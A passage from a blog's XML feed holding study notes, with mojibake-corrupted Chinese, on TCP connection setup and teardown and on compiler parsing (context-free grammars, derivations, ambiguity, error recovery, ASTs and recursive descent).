id="tcpçš„setup-teardown">TCPçš„Setup &amp; Teardown</h2><p>å¯é çš„é€šä¿¡ä¾èµ–äºé€šä¿¡åŒæ–¹çš„çŠ¶æ€</p><p>é—®é¢˜æ˜¯é“¾æ¥å»ºç«‹çš„æ—¶å€™å¦‚ä½•ç»´æŠ¤è¿™ä¸ªçŠ¶æ€ï¼Ÿ</p><p>å½“æ–­è¿çš„æ—¶å€™å¦‚ä½•æ¸…ç†è¿™äº›çŠ¶æ€ï¼Ÿ</p><p>Cleaning Up Safely</p><ul><li>Problems with closed socket<ul><li>What if final ack is lost in the network</li><li>What if the same port pair is immediately resued for a newconnection ?</li></ul></li><li>Solution: 'active' closer goes into TIME WAIT<ul><li>Active close is sendingFIN before receving one</li><li>Keep socket around for 2 MSL (twice the 'maximum segmentlifetime')</li></ul></li><li>Can pose problems with servers<ul><li>OS has too many socketd in TIME WAIT, slows things down</li><li>Hack: Can send RST and delete socket, so SO_LINGER socket option totime 0</li><li>OS won't let you re-start server because port still in use(SO_REUSEADDR) option lets you re-bind used port number.</li></ul></li></ul><p><strong>TCPğŸŒ°ï¼š</strong></p><p>ä¸ç®¡æ˜¯å‘é€æ–¹è¿˜æ˜¯æ¥æ”¶æ–¹éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªåºåˆ—å·ï¼ˆç”¨äºåŒæ­¥è‡ªå·±å‘é€çš„æ•°æ®ï¼‰å’Œç¡®è®¤å·ï¼ˆç”¨äºåŒæ­¥å¯¹æ–¹çš„åºåˆ—å·ï¼‰ï¼Œå³ä½¿æ˜¯åƒå»ºç«‹è¿æ¥çš„æ—¶å€™æ•°æ®æ®µé•¿åº¦ä¸º0ï¼Œä½†æ˜¯å¯¹åº”çš„åºåˆ—å·å’Œç¡®è®¤å·ä¹Ÿè¦æ¶ˆè€—æ‰ä¸€ä¸ªåºå·ï¼ˆå³è‡ªå¢ï¼‰</p><figure><imgsrc="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a437fcc7a69a4ef9b57b34d38a02c2bf~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp"alt="image.png" /><figcaption aria-hidden="true">image.png</figcaption></figure><p>æ¥çœ‹ä¸€ä¸ªğŸŒ°ï¼šä»¥ä¸‹éƒ½æ˜¯ç›¸å¯¹åºåˆ—å·</p><figure><imgsrc="https://img-blog.csdn.net/20160818012008762?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>å®¢æˆ·ç«¯ =&gt; æœåŠ¡ç«¯: [SYN], seq = 0, len = 0, syn = 1, len = 0(å®¢æˆ·ç«¯ä¼ é€’seqå¸Œæœ›å’ŒæœåŠ¡ç«¯åŒæ­¥è‡ªå·±çš„æ•°æ®,åŒæ—¶æ¶ˆè€—æ‰å®¢æˆ·ç«¯ä¸€ä¸ªåºåˆ—å·ï¼Œä¸‹ä¸€æ¬¡å®¢æˆ·ç«¯åºåˆ—å·å°±æ˜¯ä»1å¼€å§‹)</p><p>å®¢æˆ·ç«¯ &lt;= æœåŠ¡ç«¯: [SYN, ACK] , seq = 0, ack = 1, syn = 1, len = 0(æœåŠ¡ç«¯å›åº”åŒæ­¥ï¼Œä¼ é€’seqå¸Œæœ›å’Œå®¢æˆ·ç«¯åŒæ­¥è‡ªå·±çš„æ•°æ®,åŒæ—¶æ¶ˆè€—æ‰æœåŠ¡ç«¯ä¸€ä¸ªåºåˆ—å·, ä¸‹ä¸€æ¬¡æœåŠ¡ç«¯åºåˆ—å·å°±æ˜¯ä»1å¼€å§‹)</p><p>å®¢æˆ·ç«¯ =&gt; æœåŠ¡ç«¯: [ACK], ack = 1, seq = 1, len =0(å®¢æˆ·ç«¯å›åº”åŒæ­¥)</p><p>å¼€å§‹å‘é€æ•°æ®</p><p>å®¢æˆ·ç«¯ =&gt; æœåŠ¡ç«¯ï¼š[ACK], seq = 1, len = 474, ack =1(ackç”¨äºåŒæ­¥å¯¹æ–¹çš„æ¶ˆæ¯)</p><p>å®¢æˆ·ç«¯ &lt;= æœåŠ¡ç«¯ï¼š[ACK], seq = 1, ack = 475(ackç”¨äºåŒæ­¥å¯¹æ–¹çš„æ¶ˆæ¯,è¡¨ç¤ºæˆ‘å·²ç»æ”¶åˆ°ä½ çš„å‰474ä¸ªæ•°æ®åŒ…)ï¼ŒæœåŠ¡ç«¯æ— å“åº”æ•°æ®ï¼Œä»…ä»…æ˜¯ackæ•°æ®åŒ…</p><p>å®¢æˆ·ç«¯ &lt;= æœåŠ¡ç«¯ï¼š[ACK], seq = 1, ack = 475, len = 1448, next seq= 1449, æ˜¯å¯¹ä¸Šä¸€æ¬¡çš„å®¢æˆ·ç«¯è¯·æ±‚çš„ä¸€æ¬¡tcpå“åº”åŒ…</p><p>å®¢æˆ·ç«¯ &lt;= æœåŠ¡ç«¯ï¼š[ACK], seq = 1449, ack = 475, len = 1448, nextseq = 2897, ä¾æ—§æ˜¯å¯¹ä¸Šä¸€æ¬¡çš„å®¢æˆ·ç«¯è¯·æ±‚çš„ä¸€æ¬¡tcpå“åº”åŒ…</p><p>å®¢æˆ·ç«¯ &lt;= æœåŠ¡ç«¯ï¼š[ACK], seq = 2897, ack = 475, len = 1334, nextseq = 2897 + 1334, è¿˜æ˜¯å¯¹ä¸Šä¸€æ¬¡çš„å®¢æˆ·ç«¯è¯·æ±‚çš„ä¸€æ¬¡tcpå“åº”åŒ…</p><p>ä¸Šé¢çš„åºåˆ—å·æ˜¯ç›¸å¯¹çš„ï¼Œæ‰€ä»¥çœ‹èµ·æ¥éƒ½æ˜¯ä»0å¼€å§‹ï¼Œä½†æ˜¯å®é™…ä¸Šèµ·å§‹åºåˆ—å·æ˜¯éšæœºçš„ï¼Œä¸ºä»€ä¹ˆè¦åˆå§‹åŒ–èµ·å§‹åºåˆ—å·ï¼Ÿ</p><ul><li>é¿å…å¶ç„¶æ€§ï¼Œé˜²æ­¢æ„å¤–ä¹±å…¥</li><li>å®‰å…¨æ€§ï¼Œé˜²æ­¢æ¶æ„æ’å…¥ï¼Œå› ä¸ºå¦‚æœèµ·å§‹åºåˆ—å·æ˜¯å›ºå®šçš„æ´»ç€å®¹æ˜“çŒœåˆ°çš„ï¼Œåœ¨ç½‘ç»œä»£ç†ä¸­ï¼ŒæŠ“åˆ°tcpåŒ…ï¼Œå³å¯æ’å…¥è‡ªå·±çš„æ•°æ®ï¼Œä½†æ˜¯å®é™…ä¸Šå‡ ä¹æ‰€æœ‰ä»£ç†å·¥å…·éƒ½æ— æ³•è§£æé“tcpçš„èµ·å§‹åºåˆ—å·ã€‚</li></ul><p>https://www.cnblogs.com/163yun/p/9552368.html</p>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºç½‘ç»œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç½‘ç»œï¼Œè®¡ç®—æœºåŸºç¡€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 1 Introduction</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>WIP</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 2 Lexical Analysis</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%8C/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p>WIP</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 3 Parsing Analysis 1 (Introduction &amp; LL Analysis)</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%89/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>Regular languages</p><ul><li>The weakest formal languages widely used</li><li>Many applications</li></ul><p>æ­£åˆ™è¡¨è¾¾å¼çš„ç¼ºé™·ï¼š</p><ul><li></li></ul><p>Parserï¼š</p><ul><li>Input: sequence of tokens from lexer</li><li>Output: parse tree pf the program</li></ul><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs hsp">Cool:<br><span class="hljs-keyword">if</span> x = y then <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">2</span> fi<br>Parser <span class="hljs-keyword">input</span>:<br><span class="hljs-keyword">IF</span> ID = ID THEN <span class="hljs-keyword">INT</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-keyword">INT</span> FI<br>Parser output:<br> <span class="hljs-keyword">IF</span>-THEN-<span class="hljs-keyword">ELSE</span><br>=      <span class="hljs-keyword">INT</span>      <span class="hljs-keyword">INT</span><br>ID ID    <br></code></pre></td></tr></table></figure><table><thead><tr class="header"><th>Phase</th><th>Intput</th><th>Output</th></tr></thead><tbody><tr class="odd"><td>Lexer</td><td>String of characters</td><td>String of tokens</td></tr><tr class="even"><td>Parser</td><td>String of tokens</td><td>Parse tree</td></tr></tbody></table><blockquote><p>ä¸Šé¢ä¸¤æ­¥æœ‰çš„ç¼–è¯‘å™¨æ˜¯åˆ†å¼€åšçš„ï¼Œæœ‰çš„ç¼–è¯‘å™¨æ˜¯æ”¾åœ¨ä¸€èµ·åšçš„</p></blockquote><h2 id="ä¸Šä¸‹æ— å…³æ–‡æ³•">ä¸Šä¸‹æ— å…³æ–‡æ³•</h2><p>ç”±è¯æ³•åˆ†æå™¨å¾—åˆ°çš„tokenså¹¶ä¸å…¨æ˜¯æœ‰ç”¨çš„ï¼Œæ¯”å¦‚æ ‡ç‚¹ç¬¦å·ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨å¿…é¡»è¯†åˆ«å“ªäº›æ˜¯æœ‰æ•ˆtokenï¼Œå“ªäº›æ˜¯æ— æ•ˆçš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æè¿°è§„åˆ™æ¥æè¿°ä½•ä¸ºæœ‰æ•ˆtokenï¼Œä»¥åŠä¸€ç§è¯†åˆ«æœ‰æ•ˆtokençš„æ–¹æ³•</p><p>ç¨‹åºè¯­è¨€éƒ½æ˜¯æœ‰ç€nested(é€’å½’)çš„ç»“æ„ï¼Œå¦‚ï¼š</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">EXPR = <span class="hljs-keyword">if</span> <span class="hljs-keyword">EXPR</span> then <span class="hljs-keyword">EXPR</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">EXPR</span> fi<br><span class="hljs-keyword">while</span> <span class="hljs-keyword">EXPR</span> loop <span class="hljs-keyword">EXPR</span> pool<br></code></pre></td></tr></table></figure><p><strong>ä¸Šä¸‹æ— å…³æ–‡æ³•æ®è¯´ä¸€ç§æè¿°è¿™ç§é€’å½’ç»“æ„çš„naturalnotation</strong></p><p>CFG ç”±ä¸‹é¢å‡ éƒ¨åˆ†æ„æˆï¼š</p><ul><li>a set of terminals: <span class="math inline">\(T\)</span></li><li>a set of nn-terminals: <span class="math inline">\(N\)</span></li><li>a start symbol: <span class="math inline">\(S (S \inN)\)</span></li><li>a set of productions:$ X -&gt; Y_1, ... Y_N (X N, Y_i N T {})$</li></ul><ol type="1"><li>Begin with a string with only the start symbol S</li><li>Replace any non-terminal X in the string by the right-hand side ofsome production</li><li>Repeat (2) until there are non-terminals</li></ol><p>let G be a contexto-free grammar with start symbol S. Then thelanguage L(G) of is: <span class="math display">\[\{ a_1, ... a_n \quad | \quad \forall_i \quad a_i \in T \and S\mathop{\rightarrow}^* a_1, ..., a_n \}\]</span></p><ul><li>Terminals are so-called because there are no-reulses for replacingthem ç»ˆç»“ç¬¦æ˜¯ä¸å˜çš„</li><li>Once generated, terminals are permanentï¼Œç»ˆç»“ç¬¦æ˜¯ä¸å˜çš„</li><li>Terminals ought to be tokens of the language(ç»ˆç»“ç¬¦ä¸€èˆ¬æ˜¯è¯­è¨€çš„tokenï¼Œæ¯”å¦‚å…³é”®å­—ï¼Œæ ‡è¯†ç¬¦)</li></ul><p>ğŸŒ°ï¼š</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery">E -&gt; E + E<br> | E * E<br> | (E)<br> |<span class="hljs-built_in"> id</span><br> <br>å¯¹åº”çš„è¯­è¨€ï¼š<span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span> +<span class="hljs-built_in"> id</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span> +<span class="hljs-built_in"> id</span> *<span class="hljs-built_in"> id</span><br><span class="hljs-built_in">(id</span> +<span class="hljs-built_in"> id</span>) *<span class="hljs-built_in"> id</span><br></code></pre></td></tr></table></figure><p>æ•´ä¸ªCFGæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ­¥éª¤ï¼Œéœ€è¦ï¼š</p><ul><li>Membership in a alnguage is yes or no, also parse tree of theinput</li><li>Must handle errors gracefully</li><li>Need an implementation of CFG's (eg: bison)</li></ul><h2 id="derivationsæ¨å¯¼">Derivations(æ¨å¯¼)</h2><p>A derivations s a <strong>sequence</strong> f production: <spanclass="math display">\[S -&gt; .. -&gt; ,,, -&gt; ... -&gt; ..\]</span> æ¨å¯¼è¿‡ç¨‹å¯ä»¥ä»¥æ ‘çš„å½¢å¼ç”»å‡ºæ¥ï¼š</p><ul><li>start symbol is the tree's root</li><li>For a production <spanclass="math inline">\(X-&gt;Y_1Y_2..Y_n\)</span> add children <spanclass="math inline">\(Y_1Y_2...Y_n\)</span> o node X</li></ul><p>è€ƒè™‘ä¸‹é¢è¯­æ³•ï¼š <span class="math display">\[E â†’ E + E |  E * E | (E) | id\]</span> ä»¥åŠå­—ç¬¦ä¸²ï¼šid * id + id</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617134603437.png"alt="image-20230617134603437" /><figcaption aria-hidden="true">image-20230617134603437</figcaption></figure><p>A parse tree has</p><ul><li>Terminals at the leaves</li><li>Non-terminals at the interior nodes</li></ul><blockquote><p>å¯¹å¶å­èŠ‚ç‚¹çš„in-orderéå†å°±æ˜¯åŸå§‹è¾“å‡ºï¼Œparsetreeè¡¨ç¤ºäº†tokenä¹‹é—´çš„å„ç§å…³ç³»</p><p>å¦‚ä¸‹ï¼š</p><p>å¶å­èŠ‚ç‚¹ä»å·¦åˆ°å³ï¼šå°±æ˜¯åŸå§‹è¾“å…¥ï¼šid * id + id</p><p>ä¸­é—´èŠ‚ç‚¹å’Œå·¦å³å…„å¼ŸèŠ‚ç‚¹çš„å…³ç³»ä¹Ÿå¾ˆæ˜ç¡®ï¼Œ*çš„å·¦å³å°±æ˜¯id</p></blockquote><p>ä¸Šè¿°æ¨å¯¼å¼çš„äº§ç”Ÿæ˜¯left-mostï¼Œå³åœ¨æ¯ä¸€æ­¥ä¼˜å…ˆæ¨å¯¼æœ€å·¦è¾¹çš„ç¬¦å·ï¼ˆå³æ¨å¯¼æ–¹å‘æ˜¯è‡ªå·¦å‘å³ï¼‰ï¼Œä½†æ˜¯è¿™æ ·å¯èƒ½ä¼šå‡ºç°æ²¡æœ‰ç»“æŸæ¡ä»¶è€Œä¸€ç›´æ— é™æ¨å¯¼ä¸‹å»ã€‚è¿˜æœ‰ä¸€ç§ä¸ä¹‹ç±»ä¼¼çš„right-mostæ¨å¯¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">E<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E + E</span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E * E + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E * <span class="hljs-built_in">id</span> + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash"><span class="hljs-built_in">id</span> * <span class="hljs-built_in">id</span> + <span class="hljs-built_in">id</span></span><br></code></pre></td></tr></table></figure><blockquote><p>Note that r-most and l-most derivations have the same parse tree</p><p>A derivations defines a parse tree, but one parse tree may have manyderivations</p><p>ä¸€ä¸ªParse treeå¯èƒ½æœ‰å¾ˆå¤šç§æ¨å¯¼æ–¹å¼å¯ä»¥å¾—åˆ°ï¼Œä½†æ˜¯æœ€å·¦æ¨å¯¼å’Œæœ€å³æ¨å¯¼æ˜¯æœ€é‡è¦çš„ä¸¤ç§æ–¹å¼</p></blockquote><p><strong>Conclusion</strong>:</p><ul><li>ä¸ä»…å¯¹æŸä¸ªå­—ç¬¦ä¸²æ˜¯å¦å±äºL(G)(è¯­æ³•Gæ‰€äº§ç”Ÿçš„è¯­è¨€)æ„Ÿå…´è¶£ï¼Œä¹Ÿéœ€è¦å¯¹åº”çš„è§£ææ ‘</li><li>ä¸€ä¸ªæ¨å¯¼å¼å®šä¹‰äº†ä¸€ä¸ªè§£ææ ‘ï¼ˆæˆ–è€…è§£ææ ‘çš„ä¸€éƒ¨åˆ†ï¼‰ï¼ŒåŒä¸€ä¸ªParse treeå¯èƒ½æœ‰å¾ˆå¤šç§æ¨å¯¼æ–¹å¼å¯ä»¥å¾—åˆ°</li></ul><h2 id="ambiguityè¯­æ³•çš„äºŒä¹‰æ€§">Ambiguity(è¯­æ³•çš„äºŒä¹‰æ€§)</h2><h3 id="è§£æä¼˜å…ˆçº§">è§£æä¼˜å…ˆçº§</h3><p>Grammar: E -&gt; E + E | E * E | (E) | id</p><p>String stream: id * id + id</p><p>ä¸åŒçš„æ¨å¯¼å¾—åˆ°ä¸åŒçš„parse treeï¼š</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">*</span> <span class="hljs-built_in">E</span> <span class="hljs-variable">id</span><br><span class="hljs-variable">id</span>  <span class="hljs-variable">id</span> <br><br><span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span>  <span class="hljs-operator">*</span>  <span class="hljs-built_in">E</span><br>  <span class="hljs-variable">id</span>  <span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br> <span class="hljs-variable">id</span>   <span class="hljs-variable">id</span> <br></code></pre></td></tr></table></figure><blockquote><p>A grammar is ambiguous if it has more than one parse tree for somestring, æ¢å¥è¯è¯´ï¼Œå¯¹äºæŸäº›å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç”±è¶…è¿‡ä¸€ç§çš„åšä½œæˆ–æœ€å³æ¨å¯¼æ–¹å¼</p></blockquote><p><strong>How to handle ambiguous</strong></p><p>Method 1:</p><p>é‡å†™è¯­æ³•ï¼šå…¶å®æœ¬è´¨ä¸Šæ˜¯å¼ºåˆ¶äº†è§£ææ—¶å€™çš„ä¼˜å…ˆçº§</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">E -&gt; <span class="hljs-string">E&#x27; + E/E&#x27;</span><br><span class="hljs-string">E&#x27; -&gt; id * E&#x27;</span> | id | (E) * <span class="hljs-string">E&#x27;| (E) </span><br></code></pre></td></tr></table></figure><p>Method 2ï¼š</p><p>ä¸é‡å†™ï¼Œä½†æ˜¯åœ¨è§£æçš„æ—¶å€™ï¼Œä½¿ç”¨ä¼˜å…ˆçº§æˆ–è€…åˆ¤æ–­å“ªä¸ªæ˜¯æœ€ä¼˜çš„</p><h3 id="ç»“åˆæ€§">ç»“åˆæ€§</h3><h2 id="parsing-error-handleparserè¿‡ç¨‹çš„é”™è¯¯å¤„ç†">Parsing ErrorHandle(parserè¿‡ç¨‹çš„é”™è¯¯å¤„ç†)</h2><table><thead><tr class="header"><th>Error kind</th><th>Example</th><th>Detected by</th></tr></thead><tbody><tr class="odd"><td>Lexical</td><td>ä½¿ç”¨äº†æœªçŸ¥ç¬¦å·ï¼Œæ¯”å¦‚elseå†™æˆäº†eles</td><td>Lexer</td></tr><tr class="even"><td>Syntax</td><td>ç¼–å†™çš„ç¨‹åºå­˜åœ¨ç»“æ„é”™è¯¯ï¼Œæ¯”å¦‚whileåé¢åº”è¯¥æœ‰ä¸€å¯¹{},ä½†æ˜¯åªå†™äº†ä¸€ä¸ª{</td><td>parser</td></tr><tr class="odd"><td>Semantic</td><td>int x; x(3);å£°æ˜xä¸ºæ™®é€šå˜é‡ï¼Œä½†æ˜¯å´æŠŠxå½“æˆå‡½æ•°ä½¿ç”¨</td><td>Type Checker</td></tr><tr class="even"><td>Correctness</td><td>è‡ªå·±çš„ä»£ç è™½ç„¶é€šè¿‡äº†ç¼–è¯‘å™¨ï¼Œä½†æ˜¯è¿è¡Œç»“æœä¸ç¬¦åˆé¢„æœŸ</td><td>User/Testerï¼Œä¸€èˆ¬éœ€è¦è‡ªå·±debug</td></tr></tbody></table><p>Error handler should:</p><ul><li>Report errors accurately and clearly</li><li>Recover from an error quickly</li><li>Not slow down compilation of valid code</li></ul><p>å¸¸è§çš„ä¸‰ç§ä¸åŒé”™è¯¯å¤„ç†æ¨¡å¼ï¼š</p><ul><li>Panic Mode (ä½¿ç”¨ç‰¹æ®Šçš„ç»ˆæ­¢ç¬¦(error)åƒæ‰é”™è¯¯ï¼Œç»§ç»­æ‰§è¡Œ)<ul><li>When an error is detected<ul><li>Discard tokens until one with clear role is found</li><li>Continue from here</li></ul></li></ul></li></ul><p>â€‹ ğŸŒ°ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(1 + + 2) + 2<br><span class="hljs-keyword">skip </span>ahead to next interger and then continue<br></code></pre></td></tr></table></figure><p>Bison: use the special terminal error to descide how mucg input toskip</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">E -&gt; int | <span class="hljs-type">E</span> + E | <span class="hljs-type">(E</span>) | <span class="hljs-type">error</span> int | <span class="hljs-type">(error</span>)<br></code></pre></td></tr></table></figure><ul><li><p>Error productions (æ·»åŠ å¯èƒ½çš„é”™è¯¯çš„æ¨å¯¼å¼): specify known commonmistakes in the grammar</p><p>Eg: write 5 x instead of 5 * x</p><p>Add production E -&gt; .... | E E</p><p>Disadvantage: complicates the grammar</p></li><li><p>Automatic local or global correction</p><ul><li>Find a correct "nearby" program<ul><li>try token insertions and deletions (ç¼–è¾‘è·ç¦»)</li><li>exhaustive search</li></ul></li><li>Disadvantages:<ul><li>hard to impl</li><li>slows down parsing of correct programs</li><li>"nearby" is not necessarily "the intended" program</li></ul></li></ul></li></ul><p>Past:</p><ul><li>Slow recompilation cycle (even once a day)</li><li>rind as many errors in one cycle as possible</li></ul><p>Present:</p><ul><li>Quick recompilation cycle</li><li>users tend to correct one error/cycle</li><li>Complex error recovery is less compelling</li></ul><h2 id="another-clean-parse-tree-form-ast">Another Clean Parse Tree Formâ€”â€” AST</h2><p>Parserè·Ÿè¸ª(trace)ä¸€ä¸ªtokenåºåˆ—çš„æ¨å¯¼è¿‡ç¨‹ï¼Œå¹¶ç”±æ­¤äº§ç”ŸParse tree</p><p>ğŸŒ°ï¼š</p><p>Grammar: E -&gt; int | (E) | E + E</p><p>After lexical analysis: [Int(2), '+', '(', Int(1), '+', 'Int(5),')']</p><p>Parse Tree:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">E<br>E + E<br><span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>) (E)<br>E + E<br><span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">int</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>ASTï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[Plus, leftO, rightO]</span><br><span class="hljs-built_in">Int</span>(<span class="hljs-number">2</span>)  <span class="hljs-selector-attr">[Plus, leftO, rightO]</span><br><span class="hljs-built_in">Int</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">Int</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>è¢«ç§°ä¹‹ä¸ºASTï¼Œå› ä¸ºå®ƒä»å…·ä½“è¯­æ³•ä¸­æŠ½è±¡å‡ºæ¥ï¼Œç…ç‚’äº†å…·ä½“è¯­æ³•çš„ç»†èŠ‚ï¼›è€ŒParseTreeå±•ç¤ºäº†å…·ä½“çš„æ¨å¯¼è§„åˆ™å’Œç›¸å…³ç»“æ„ï¼Œå¯¹äºç¼–è¯‘å™¨æ¥æ°´è¯´ï¼Œæœ‰å¾ˆå¤šä¸å¿…è¦çš„å†…å®¹</p><h3 id="é€’å½’ä¸‹é™è§£æ">é€’å½’ä¸‹é™è§£æ</h3><p>è§£ææ ‘ä¸€èˆ¬æŒ‰ç…§å¦‚ä¸‹æ–¹å¼æ„å»ºï¼š</p><ul><li>è‡ªä¸Šè‡³ä¸‹</li><li>ä»å·¦åˆ°å³</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span><br><span class="hljs-built_in">t2</span>. <span class="hljs-number">3</span>.  <span class="hljs-built_in">t9</span><br>   <span class="hljs-number">4</span>. <span class="hljs-number">7</span> <br>  <span class="hljs-built_in">t5</span>. <span class="hljs-built_in">t6</span>.  <span class="hljs-built_in">t8</span><br></code></pre></td></tr></table></figure><p>Tokens: [t2, t5, t6, t8, t9]</p><p>çœ‹ä¸€ä¸ªè¯¦ç»†çš„é€’å½’ä¸‹é™è§£æçš„ğŸŒ°ï¼š</p><p>è€ƒè™‘è¯­æ³•Grammar:</p><p>E -&gt; T | T | T + E</p><p>T -&gt; int | int * T | (E)</p><p>è¾“å…¥ï¼š<span class="math inline">\((int_5)\)</span></p><p>æ­¥éª¤ï¼š</p><p>ä»èµ·å§‹è²ç»ˆç»“ç¬¦å¼€å§‹ï¼Œä¾æ¬¡å°è¯•å…³äºEçš„æ¨å¯¼å¼</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-type">E</span> -&gt; <span class="hljs-type">T</span> -&gt; <span class="hljs-built_in">int</span> (mismatch: <span class="hljs-built_in">int</span> does not <span class="hljs-keyword">match</span> (, backtrack) =&gt;<br> <span class="hljs-type">T</span> -&gt; [<span class="hljs-built_in">int</span> * <span class="hljs-type">T</span>] (mismatch: <span class="hljs-built_in">int</span> does not <span class="hljs-keyword">match</span> (, backtrack) =&gt;<br> <span class="hljs-type">T</span> -&gt; ( <span class="hljs-type">E</span> ) (<span class="hljs-keyword">match</span>: ç»§ç»­ä¸‹ä¸€ä¸ªè¾“å…¥å­—ç¬¦<span class="hljs-built_in">int</span> =&gt;<br> <span class="hljs-type">T</span> -&gt; ( <span class="hljs-type">E</span> -&gt; <span class="hljs-built_in">int</span> ) (<span class="hljs-keyword">match</span>: ç»§ç»­ä¸‹ä¸€ä¸ªè¾“å…¥å­—ç¬¦) 